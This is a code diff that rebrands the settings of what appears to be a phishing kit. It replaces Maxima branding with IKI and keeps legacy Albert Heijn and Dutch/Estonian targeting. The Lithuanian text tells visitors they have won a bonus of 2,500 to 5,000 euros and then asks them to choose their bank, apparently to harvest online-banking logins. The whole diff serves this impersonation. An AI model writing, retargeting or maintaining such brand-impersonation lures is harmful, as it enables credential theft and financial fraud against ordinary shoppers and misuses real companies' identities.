@@ -55,7 +55,7 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 };
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
-const ALBERT_HEIJN_LOGO_URL = "/form-assets/maxima-mini-logo.png";
+const ALBERT_HEIJN_LOGO_URL = "/form-assets/iki-mini-logo.png";
 const PORTAL_BG_URL = "/form-assets/bg-desktop.png";
 const LEGACY_BG_URL = "/spar-bg.png";
 const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
@@ -76,7 +76,7 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     next.logo_url === "/logo.png" ||
     next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
   ) {
-    next.logo_url = "/form-assets/maxima-mini-logo.png";
+    next.logo_url = "/form-assets/iki-mini-logo.png";
   }
 
   if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
@@ -84,20 +84,20 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
   }
 
   if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
-    next.portal_name = "Maxima klientų portalas";
+    next.portal_name = "IKI klientų portalas";
   }
 
   if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
-    next.support_center_name = "Maxima pagalbos centras";
+    next.support_center_name = "IKI pagalbos centras";
   }
 
   if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
-    next.win_title = "Išskirtinė Maxima premija";
+    next.win_title = "Išskirtinė IKI premija";
   }
 
   if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
     next.win_subtitle =
-      "Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte iki 2 500 eurų premiją.";
+      "Sveikiname! Buvote atrinkti šios dienos IKI kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte iki 2 500 eurų premiją.";
   }
 
   if (!next.target_country || next.target_country === "Hollanda" || next.target_country === "Estonya") {
@@ -116,13 +116,13 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 }
 
 export const defaultSettings: GlobalSettings = {
-  logo_url: "/form-assets/maxima-mini-logo.png",
+  logo_url: "/form-assets/iki-mini-logo.png",
   bg_url: PORTAL_BG_URL,
-  portal_name: "Maxima klientų portalas",
-  support_center_name: "Maxima klientų aptarnavimas",
-  win_title: "Išskirtinė Maxima premija",
+  portal_name: "IKI klientų portalas",
+  support_center_name: "IKI pagalbos centras",
+  win_title: "Išskirtinė IKI premija",
   win_subtitle:
-    "Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo 5000 eurų premiją.",
+    "Sveikiname! Buvote atrinkti šios dienos IKI kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo 5000 eurų premiją.",
   win_button: "Atsiimti premiją",
   banken_title: "Pasirinkite savo banką",
   banken_subtitle: "Pasirinkite savo banką, kad tęstumėte.",
